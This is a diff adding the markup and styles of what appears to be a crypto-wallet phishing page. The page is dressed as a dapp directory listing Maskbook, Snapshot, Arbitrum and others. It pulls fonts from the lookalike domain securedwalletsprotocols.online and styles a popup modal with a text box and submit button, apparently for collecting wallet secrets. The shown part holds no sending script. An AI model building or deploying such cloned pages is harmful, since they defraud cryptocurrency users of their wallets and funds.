+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Space
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Maskbook" class="img_icons" src="local_resources/img/dd8f50f90007cef0e3575450db93ba68.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Maskbook
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Snapshot" class="img_icons" src="local_resources/img/79952c02ac35e7b3a3e5505cbe786faf.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Snapshot
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Invoice.build" class="img_icons" src="local_resources/img/65d73d33e1cdb5c69af304f4f2b6fa7b.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Invoice.build
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Ankr" class="img_icons" src="local_resources/img/2a097904d50acfd9a4cd2ce5b7bbad06.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Ankr
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="DODO" class="img_icons" src="local_resources/img/31411abbec74297205517c15d085bb64.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          DODO
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="zLOT" class="img_icons" src="local_resources/img/aa6c688e968ea638d076c9ca15340b53.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          zLOT
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Tokamak Network" class="img_icons" src="local_resources/img/21d6a9fa8317f7dd8b60ba1621b9a09c.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Tokamak Network
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Actus Protocol" class="img_icons" src="local_resources/img/472f2bff53088c4b87d43d02c80eab3d.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Actus Protocol
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="AstroTools.io" class="img_icons" src="local_resources/img/7cbe25e5f24c549d23583fdb74d0f396.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          AstroTools.io
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Rubic Exchange" class="img_icons" src="local_resources/img/e0d60411108fa3afbd78823ae9084ea9.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Rubic Exchange
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Rubic Exchange" class="img_icons" src="local_resources/img/8a6e05795c6827fa7538ff23e482ed11.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Torus Wallet
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Rubic Exchange" class="img_icons" src="local_resources/img/1087d52a27aa55213213449331ea2b3a.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Oceanprotocol
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Rubic Exchange" class="img_icons" src="local_resources/img/b83ea1b62d7dae14f4380b2d737afb45.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Filecone Wallet
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Rubic Exchange" class="img_icons" src="local_resources/img/780ffe99f4320b9179ef8e0049ae9323.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Falconswap
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Rubic Exchange" class="img_icons" src="local_resources/img/042e86838d70f62fde7e62cc913492d1.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Bancor Wallet
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Harvest Finance" class="img_icons" src="local_resources/img/bae752e9e132ba25eb3d0bf3d939cc5f.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Harvest Finance
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="OctoFi" class="img_icons" src="local_resources/img/8b573c158c7b3eaf20109e96fcb4daed.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          OctoFi
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Mushroom Finance" class="img_icons" src="local_resources/img/a1dce650ce442d4bc8d1c0a44057865c.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Mushroom Finance
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Bitfrost Finance" class="img_icons" src="local_resources/img/ba830ac2dfed057e908a13eb73443ac9.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Bitfrost Finance
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="XinFin XDC Network" class="img_icons" src="local_resources/img/a7830175598d2295868e1caa9adbf547.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          XinFin XDC Network
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Orchid Protocol" class="img_icons" src="local_resources/img/c5df27634ccf5fff2162f51a3e6868d2.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Orchid Protocol
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Datamine Network" class="img_icons" src="local_resources/img/4835e58738666c829a96208634672daf.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Datamine Network
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Streamr" class="img_icons" src="local_resources/img/b794496990c9d6af48c0bb9222c08659.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Streamr
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="DappRadar" class="img_icons" src="local_resources/img/6c7aa8ad093651e90f04b4a79f984e6c.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          DappRadar
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="SuperRare" class="img_icons" src="local_resources/img/3e394145839577515100e2f9ede78e0c.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          SuperRare
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Arbitrum" class="img_icons" src="local_resources/img/87429fed8a2be2516e64924cd59eff24.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Arbitrum
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="ParaSwap" class="img_icons" src="local_resources/img/b5ca0f918243ac764e346513ccaa7690.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          ParaSwap
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="HoneySwap" class="img_icons" src="local_resources/img/cd5dde9c73b9deee8f6e156748c3827f.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          HoneySwap
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Fleek" class="img_icons" src="local_resources/img/dc231405fd7fd6e8649dcd03c4b3bdec.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Fleek
+                        </div>
+</div>
+</div>
+</section>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div aria-atomic="true" aria-live="assertive" id="gatsby-announcer" style="
+          position: absolute;
+          top: 0;
+          width: 1px;
+          height: 1px;
+          padding: 0;
+          overflow: hidden;
+          clip: rect(0, 0, 0, 0);
+          white-space: nowrap;
+          border: 0;
+        "></div>
+</div>
+<!-- <script src="assets/polyfill-5ef5a555a07b3c6452d1.js" nomodule=""></script> -->
+<!-- <script src="assets/component---src-pages-apps-tsx-50d212c53780f4e2ed64.js" async=""></script> -->
+<!-- <script src="assets/commons-728581910d6e685fb39c.js" async=""></script> -->
+<!-- <script src="assets/app-2b5a75f35e7d5a1e67ad.js" async=""></script> -->
+<!-- <script src="assets/framework-8e528b732ab2eaadb7b7.js" async=""></script>
+  <script src="assets/webpack-runtime-08a0e953018334063ddd.js" async=""></script> -->
+<style>
+      /*! CSS Used from: Embedded */
+      img {
+        border-style: none;
+      }
+
+      button,
+      input,
+      textarea {
+        font-family: inherit;
+        font-size: 100%;
+        line-height: 1.15;
+        margin: 0;
+      }
+
+      button,
+      input {
+        overflow: visible;
+      }
+
+      button {
+        text-transform: none;
+      }
+
+      [type="button"],
+      button {
+        -webkit-appearance: button;
+      }
+
+      [type="button"]::-moz-focus-inner,
+      button::-moz-focus-inner {
+        border-style: none;
+        padding: 0;
+      }
+
+      [type="button"]:-moz-focusring,
+      button:-moz-focusring {
+        outline: 1px dotted ButtonText;
+      }
+
+      textarea {
+        overflow: auto;
+      }
+
+      h3,
+      p {
+        margin: 0;
+      }
+
+      button {
+        background-color: transparent;
+        background-image: none;
+      }
+
+      button:focus {
+        outline: 1px dotted;
+        outline: 5px auto -webkit-focus-ring-color;
+      }
+
+      *,
+      :after,
+      :before {
+        box-sizing: border-box;
+        border: 0 solid #e2e8f0;
+      }
+
+      img {
+        border-style: solid;
+      }
+
+      textarea {
+        resize: vertical;
+      }
+
+      input::-moz-placeholder,
+      textarea::-moz-placeholder {
+        color: #a0aec0;
+      }
+
+      input:-ms-input-placeholder,
+      textarea:-ms-input-placeholder {
+        color: #a0aec0;
+      }
+
+      input::placeholder,
+      textarea::placeholder {
+        color: #a0aec0;
+      }
+
+      button {
+        cursor: pointer;
+      }
+
+      h3 {
+        font-size: inherit;
+        font-weight: inherit;
+      }
+
+      button,
+      input,
+      textarea {
+        padding: 0;
+        line-height: inherit;
+        color: inherit;
+      }
+
+      img,
+      svg {
+        display: block;
+        vertical-align: middle;
+      }
+
+      img {
+        max-width: 100%;
+        height: auto;
+      }
+
+      .bg-white {
+        --bg-opacity: 1;
+        background-color: #fff;
+        background-color: rgba(255, 255, 255, var(--bg-opacity));
+      }
+
+      .bg-red-100 {
+        --bg-opacity: 1;
+        background-color: #fff5f5;
+        background-color: rgba(255, 245, 245, var(--bg-opacity));
+      }
+
+      .bg-red-600 {
+        --bg-opacity: 1;
+        background-color: #e53e3e;
+        background-color: rgba(229, 62, 62, var(--bg-opacity));
+      }
+
+      .bg-blue-600 {
+        --bg-opacity: 1;
+        background-color: #3182ce;
+        background-color: rgba(49, 130, 206, var(--bg-opacity));
+      }
+
+      .hover\:bg-red-700:hover {
+        --bg-opacity: 1;
+        background-color: #c53030;
+        background-color: rgba(197, 48, 48, var(--bg-opacity));
+      }
+
+      .hover\:bg-blue-700:hover {
+        --bg-opacity: 1;
+        background-color: #2b6cb0;
+        background-color: rgba(43, 108, 176, var(--bg-opacity));
+      }
+
+      .border-transparent {
+        border-color: transparent;
+      }
+
+      .border-white {
+        --border-opacity: 1;
+        border-color: #fff;
+        border-color: rgba(255, 255, 255, var(--border-opacity));
+      }
+
+      .border-gray-400 {
+        --border-opacity: 1;
+        border-color: #cbd5e0;
+        border-color: rgba(203, 213, 224, var(--border-opacity));
+      }
+
+      .hover\:border-blue-600:hover {
+        --border-opacity: 1;
+        border-color: #3182ce;
+        border-color: rgba(49, 130, 206, var(--border-opacity));
+      }
+
+      .focus\:border-blue-400:focus {
+        --border-opacity: 1;
+        border-color: #63b3ed;
+        border-color: rgba(99, 179, 237, var(--border-opacity));
+      }
+
+      .rounded {
+        border-radius: 0.25rem;
+      }
+
+      .rounded-md {
+        border-radius: 0.375rem;
+      }
+
+      .rounded-lg {
+        border-radius: 0.5rem;
+      }
+
+      .rounded-full {
+        border-radius: 9999px;
+      }
+
+      .border {
+        border-width: 1px;
+      }
+
+      .border-b-2 {
+        border-bottom-width: 2px;
+      }
+
+      .cursor-pointer {
+        cursor: pointer;
+      }
+
+      .inline-block {
+        display: inline-block;
+      }
+
+      .flex {
+        display: flex;
+      }
+
+      .inline-flex {
+        display: inline-flex;
+      }
+
+      .flex-col {
+        flex-direction: column;
+      }
+
+      .items-center {
+        align-items: center;
+      }
+
+      .justify-center {
+        justify-content: center;
+      }
+
+      .justify-evenly {
+        justify-content: space-evenly;
+      }
+
+      .flex-shrink-0 {
+        flex-shrink: 0;
+      }
+
+      .font-medium {
+        font-weight: 500;
+      }
+
+      .h-6 {
+        height: 1.5rem;
+      }
+
+      .h-12 {
+        height: 3rem;
+      }
+
+      .text-xs {
+        font-size: 0.75rem;
+      }
+
+      .text-sm {
+        font-size: 0.875rem;
+      }
+
+      .text-base {
+        font-size: 1rem;
+      }
+
+      .text-lg {
+        font-size: 1.125rem;
+      }
+
+      .leading-6 {
+        line-height: 1.5rem;
+      }
+
+      .mx-auto {
+        margin-left: auto;
+        margin-right: auto;
+      }
+
+      .mt-2 {
+        margin-top: 0.5rem;
+      }
+
+      .mr-2 {
+        margin-right: 0.5rem;
+      }
+
+      .mt-3 {
+        margin-top: 0.75rem;
+      }
+
+      .mb-4 {
+        margin-bottom: 1rem;
+      }
+
+      .mt-6 {
+        margin-top: 1.5rem;
+      }
+
+      .mb-6 {
+        margin-bottom: 1.5rem;
+      }
+
+      .mt-10 {
+        margin-top: 2.5rem;
+      }
+
+      .mr-10 {
+        margin-right: 2.5rem;
+      }
+
+      .object-contain {
+        -o-object-fit: contain;
+        object-fit: contain;
+      }
+
+      .focus\:outline-none:focus {
+        outline: 2px solid transparent;
+        outline-offset: 2px;
+      }
+
+      .overflow-hidden {
+        overflow: hidden;
+      }
+
+      .p-2 {
+        padding: 0.5rem;
+      }
+
+      .py-2 {
+        padding-top: 0.5rem;
+        padding-bottom: 0.5rem;
+      }
+
+      .py-3 {
+        padding-top: 0.75rem;
+        padding-bottom: 0.75rem;
+      }
+
+      .px-4 {
+        padding-left: 1rem;
+        padding-right: 1rem;
+      }
+
+      .pr-4 {
+        padding-right: 1rem;
+      }
+
+      .pb-4 {
+        padding-bottom: 1rem;
+      }
+
+      .pl-4 {
+        padding-left: 1rem;
+      }
+
+      .pt-5 {
+        padding-top: 1.25rem;
+      }
+
+      .placeholder-gray-500::-moz-placeholder {
+        --placeholder-opacity: 1;
+        color: #a0aec0;
+        color: rgba(160, 174, 192, var(--placeholder-opacity));
+      }
+
+      .placeholder-gray-500:-ms-input-placeholder {
+        --placeholder-opacity: 1;
+        color: #a0aec0;
+        color: rgba(160, 174, 192, var(--placeholder-opacity));
+      }
+
+      .placeholder-gray-500::placeholder {
+        --placeholder-opacity: 1;
+        color: #a0aec0;
+        color: rgba(160, 174, 192, var(--placeholder-opacity));
+      }
+
+      .relative {
+        position: relative;
+      }
+
+      .shadow-sm {
+        box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
+      }
+
+      .shadow-xl {
+        box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1),
+          0 10px 10px -5px rgba(0, 0, 0, 0.04);
+      }
+
+      .text-left {
+        text-align: left;
+      }
+
+      .text-center {
+        text-align: center;
+      }
+
+      .text-white {
+        --text-opacity: 1;
+        color: #fff;
+        color: rgba(255, 255, 255, var(--text-opacity));
+      }
+
+      .text-gray-900 {
+        --text-opacity: 1;
+        color: #1a202c;
+        color: rgba(26, 32, 44, var(--text-opacity));
+      }
+
+      .uppercase {
+        text-transform: uppercase;
+      }
+
+      .align-bottom {
+        vertical-align: bottom;
+      }
+
+      .w-6 {
+        width: 1.5rem;
+      }
+
+      .w-12 {
+        width: 3rem;
+      }
+
+      .w-full {
+        width: 100%;
+      }
+
+      .transform {
+        --transform-translate-x: 0;
+        --transform-translate-y: 0;
+        --transform-rotate: 0;
+        --transform-skew-x: 0;
+        --transform-skew-y: 0;
+        --transform-scale-x: 1;
+        --transform-scale-y: 1;
+        transform: translateX(var(--transform-translate-x))
+          translateY(var(--transform-translate-y))
+          rotate(var(--transform-rotate)) skewX(var(--transform-skew-x))
+          skewY(var(--transform-skew-y)) scaleX(var(--transform-scale-x))
+          scaleY(var(--transform-scale-y));
+      }
+
+      .transition-all {
+        transition-property: all;
+      }
+
+      .transition {
+        transition-property: background-color, border-color, color, fill, stroke,
+          opacity, box-shadow, transform;
+      }
+
+      .ease-in {
+        transition-timing-function: cubic-bezier(0.4, 0, 1, 1);
+      }
+
+      .duration-150 {
+        transition-duration: 0.15s;
+      }
+
+      @media (min-width: 640px) {
+        .sm\:flex {
+          display: flex;
+        }
+
+        .sm\:flex-row-reverse {
+          flex-direction: row-reverse;
+        }
+
+        .sm\:items-start {
+          align-items: flex-start;
+        }
+
+        .sm\:h-10 {
+          height: 2.5rem;
+        }
+
+        .sm\:text-sm {
+          font-size: 0.875rem;
+        }
+
+        .sm\:text-base {
+          font-size: 1rem;
+        }
+
+        .sm\:mx-0 {
+          margin-left: 0;
+          margin-right: 0;
+        }
+
+        .sm\:my-8 {
+          margin-top: 2rem;
+          margin-bottom: 2rem;
+        }
+
+        .sm\:mt-0 {
+          margin-top: 0;
+        }
+
+        .sm\:ml-3 {
+          margin-left: 0.75rem;
+        }
+
+        .sm\:ml-4 {
+          margin-left: 1rem;
+        }
+
+        .sm\:max-w-lg {
+          max-width: 32rem;
+        }
+
+        .sm\:p-6 {
+          padding: 1.5rem;
+        }
+
+        .sm\:px-6 {
+          padding-left: 1.5rem;
+          padding-right: 1.5rem;
+        }
+
+        .sm\:pb-4 {
+          padding-bottom: 1rem;
+        }
+
+        .sm\:text-left {
+          text-align: left;
+        }
+
+        .sm\:align-middle {
+          vertical-align: middle;
+        }
+
+        .sm\:w-10 {
+          width: 2.5rem;
+        }
+
+        .sm\:w-auto {
+          width: auto;
+        }
+
+        .sm\:w-full {
+          width: 100%;
+        }
+      }
+
+      @media (min-width: 768px) {
+        .md\:object-scale-down {
+          -o-object-fit: scale-down;
+          object-fit: scale-down;
+        }
+      }
+
+      /*! CSS Used from: Embedded */
+      *,
+      :after,
+      :before {
+        box-sizing: border-box;
+        margin: 0;
+      }
+
+      /*! CSS Used from: Embedded */
+      div,
+      input {
+        font-family: "DM Sans", sans-serif !important;
+      }
+
+      /*! CSS Used from: Embedded */
+      div,
+      span {
+        font-family: "DM Sans", sans-serif;
+      }
+
+      /*! CSS Used from: Embedded */
+      .active {
+        border-color: #3498db;
+      }
+
+      /*! CSS Used fontfaces */
+      @font-face {
+        font-family: "DM Sans";
+        font-style: italic;
+        font-weight: 400;
+        font-display: swap;
+        src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Fp2ywxg089UriCZa4ET-DNl0.woff2)
+          format("woff2");
+        unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB,
+          U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+      }
+
+      @font-face {
+        font-family: "DM Sans";
+        font-style: italic;
+        font-weight: 400;
+        font-display: swap;
+        src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Fp2ywxg089UriCZa4Hz-D.woff2)
+          format("woff2");
+        unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
+          U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193,
+          U+2212, U+2215, U+FEFF, U+FFFD;
+      }
+
+      @font-face {
+        font-family: "DM Sans";
+        font-style: italic;
+        font-weight: 500;
+        font-display: swap;
+        src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Ap2ywxg089UriCZaw7ByWB3wTyCg.woff2)
+          format("woff2");
+        unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB,
+          U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+      }
+
+      @font-face {
+        font-family: "DM Sans";
+        font-style: italic;
+        font-weight: 500;
+        font-display: swap;
+        src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Ap2ywxg089UriCZaw7ByWCXwT.woff2)
+          format("woff2");
+        unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
+          U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193,
+          U+2212, U+2215, U+FEFF, U+FFFD;
+      }
+
+      @font-face {
+        font-family: "DM Sans";
+        font-style: italic;
+        font-weight: 700;
+        font-display: swap;
+        src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Ap2ywxg089UriCZawpBqWB3wTyCg.woff2)
+          format("woff2");
+        unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB,
+          U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+      }
+
+      @font-face {
+        font-family: "DM Sans";
+        font-style: italic;
+        font-weight: 700;
+        font-display: swap;
+        src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Ap2ywxg089UriCZawpBqWCXwT.woff2)
+          format("woff2");
+        unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
+          U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193,
+          U+2212, U+2215, U+FEFF, U+FFFD;
+      }
+
+      @font-face {
+        font-family: "DM Sans";
+        font-style: normal;
+        font-weight: 400;
+        font-display: swap;
+        src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Hp2ywxg089UriCZ2IHSeH.woff2)
+          format("woff2");
+        unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB,
+          U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+      }
+
+      @font-face {
+        font-family: "DM Sans";
+        font-style: normal;
+        font-weight: 400;
+        font-display: swap;
+        src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Hp2ywxg089UriCZOIHQ.woff2)
+          format("woff2");
+        unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
+          U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193,
+          U+2212, U+2215, U+FEFF, U+FFFD;
+      }
+
+      @font-face {
+        font-family: "DM Sans";
+        font-style: normal;
+        font-weight: 500;
+        font-display: swap;
+        src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Cp2ywxg089UriAWCrCBamC2QX.woff2)
+          format("woff2");
+        unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB,
+          U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+      }
+
+      @font-face {
+        font-family: "DM Sans";
+        font-style: normal;
+        font-weight: 500;
+        font-display: swap;
+        src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Cp2ywxg089UriAWCrCBimCw.woff2)
+          format("woff2");
+        unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
+          U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193,
+          U+2212, U+2215, U+FEFF, U+FFFD;
+      }
+
+      @font-face {
+        font-family: "DM Sans";
+        font-style: normal;
+        font-weight: 700;
+        font-display: swap;
+        src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Cp2ywxg089UriASitCBamC2QX.woff2)
+          format("woff2");
+        unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB,
+          U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+      }
+
+      @font-face {
+        font-family: "DM Sans";
+        font-style: normal;
+        font-weight: 700;
+        font-display: swap;
+        src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Cp2ywxg089UriASitCBimCw.woff2)
+          format("woff2");
+        unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
+          U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193,
+          U+2212, U+2215, U+FEFF, U+FFFD;
+      }
+    </style>
+<style>
+      .acc-body {
+        display: none;
+      }
+
+      .acc-body.active {
+        display: block;
+      }
+    </style>
+<style>
+      .overlay {
+        position: fixed;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        width: 100%;
+        height: 100vh;
+        background-color: rgb(0, 0, 0, 0.2);
+        z-index: 99;
+      }
+
+      .aletr {
+        background-color: #fff;
+        width: 30%;
+        border-radius: 5px;
+        padding: 20px;
+        position: relative;
+      }
+
+      .close {
+        position: absolute;
+        width: 15px;
+        right: 20px;
+      }
+
+      .close img {
+        width: 15px !important;
+        cursor: pointer;
+      }
+
+      .aletr h1 {
+        padding-top: 10px;
+        text-align: center;
+        font-size: 2em;
+      }
+
+      .aletr .select {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        border-radius: 5px;
+        border: 1px solid #ccc;
+        padding: 15px;
+        margin-top: 20px;
+        width: 100%;
+        cursor: pointer;
+      }
+
+      .aletr img {
+        width: 40px;
+      }
+
+      .inputBox {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin-top: 20px;
+        margin-bottom: 20px;
+      }
+
+      .inputBox input {
+        width: 80%;
+        border-radius: 5px;
+        border: 1px solid #ccc;
+        outline: none;
+        padding: 10px;
+        color: rgb(88, 112, 135);
+      }
+
+      .errormessage {
+        color: red;
+        text-align: center;
+        width: 100%;
+        font-size: 16px;
+        display: none;
+        margin-top: 10px;
+      }
+
+      .inputBox button {
+        width: 80%;
+        border-radius: 5px;
+        border: 1px solid #ccc;
+        outline: none;
+        padding: 10px;
+        margin-top: 25px;
+        color: rgb(88, 112, 135);
+        cursor: pointer;
+      }
+
+      .inputBox textarea {
+        width: 80%;
+        border-radius: 5px;
+        border: 1px solid #ccc;
+        outline: none;
+        padding: 10px;
+        max-width: 80%;
+        color: rgb(88, 112, 135);
+      }
+
+      .sss {
+        font-size: 20px;
+      }
+
+      /* Smartphones (portrait and landscape) ----------- */
+      @media only screen and (min-device-width: 320px) and (max-device-width: 480px) {
+        /* Styles */
+        .aletr {
+          width: 90%;
+        }
+      }
+
+      /* Smartphones (landscape) ----------- */
+      @media only screen and (min-width: 321px) {
+        /* Styles */
+        .aletr {
+          width: 80%;
+        }
+      }
+
+      /* Smartphones (portrait) ----------- */
+      @media only screen and (max-width: 320px) {
+        /* Styles */
+        .aletr {
+          width: 80%;
+        }
+      }
+
+      /* iPads (portrait and landscape) ----------- */
